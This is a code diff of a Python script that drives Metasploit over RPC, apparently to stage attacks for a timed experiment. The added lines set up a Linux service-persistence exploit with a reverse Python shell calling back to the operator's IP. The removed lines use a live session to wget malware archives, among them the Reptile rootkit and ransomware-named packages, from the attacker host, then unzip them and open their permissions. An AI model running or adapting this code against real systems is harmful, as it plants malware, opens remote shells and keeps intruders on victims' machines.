@@ -20,21 +20,25 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
+    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    exploit['SESSION'] = 2
+    exploit['VERBOSE'] = True
+    payload['LHOST'] = my_ip
+
     time.sleep(2)
     output_time_file = 'time_stage_2_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    shell = client.sessions.session('1')
-    shell.write('wget --no-check-certificate http://{0}/downloads/EVIL_RABBIT.zip'.format(my_ip))
-    shell.write('wget --no-check-certificate http://{0}/downloads/Reptile.zip'.format(my_ip))
-    shell.write('wget --no-check-certificate http://{0}/downloads/randomware.zip'.format(my_ip))
-    shell.write('unzip EVIL_RABBIT.zip')
-    shell.write('unzip Reptile.zip')
-    shell.write('unzip randomware.zip')
-    shell.write('chmod -R 777 EVIL_RABBIT')
-    shell.write('chmod -R 777 Reptile')
-    shell.write('chmod -R 777 randomware')
+    exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    client.sessions.session('1').stop()
+    client.sessions.session('2').stop()
+    client.sessions.session('3').stop()
 
     time.sleep(10)
     output_time_file = 'time_stage_2_end.txt'
